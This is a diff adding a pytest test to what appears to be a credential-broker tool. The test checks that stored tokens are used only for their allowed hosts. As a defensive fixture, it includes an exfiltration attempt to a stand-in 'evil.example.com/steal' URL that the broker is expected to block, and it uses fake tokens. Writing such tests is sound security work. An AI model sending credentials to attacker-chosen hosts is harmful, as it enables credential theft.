@@ -162,3 +162,35 @@ def test_broker_redacts_query_auth_from_returned_url(vault, monkeypatch):
     assert encoded not in response.headers["location"]
     assert "«baton:redacted»" in response.headers["location"]
     assert response.redactions >= 1
+
+
+def test_broker_enforces_credential_allowed_hosts(vault, monkeypatch):
+    gh = build_credential("gh", "github", {"token": "ghp_" + "a" * 36})
+    vault.put_credential(gh)
+    vault.put_context(Context(name="ghctx", credentials=["gh"]))
+    monkeypatch.setattr(broker, "validate_target_url", lambda *_a, **_kw: None)
+    _stub_client(monkeypatch, httpx.Response(200, text="ok"))
+
+    # Allowed GitHub host succeeds
+    resp = broker.request(vault, "ghctx", "GET", "https://api.github.com/user")
+    assert resp.status == 200
+
+    # Exfiltration attempt to unrelated domain is blocked
+    with pytest.raises(broker.BrokerError, match="not allowed for host 'evil.example.com'"):
+        broker.request(vault, "ghctx", "GET", "https://evil.example.com/steal")
+
+    # Custom --allow-host override restricts generic credentials too
+    scoped = build_credential(
+        "scoped",
+        "generic",
+        {"token": "secret_token_12345"},
+        allowed_hosts=["*.internal.example.com"],
+    )
+    vault.put_credential(scoped)
+    vault.put_context(Context(name="scopedctx", credentials=["scoped"]))
+    assert (
+        broker.request(vault, "scopedctx", "GET", "https://api.internal.example.com/v1").status
+        == 200
+    )
+    with pytest.raises(broker.BrokerError, match="not allowed for host"):
+        broker.request(vault, "scopedctx", "GET", "https://other.example.com/v1")
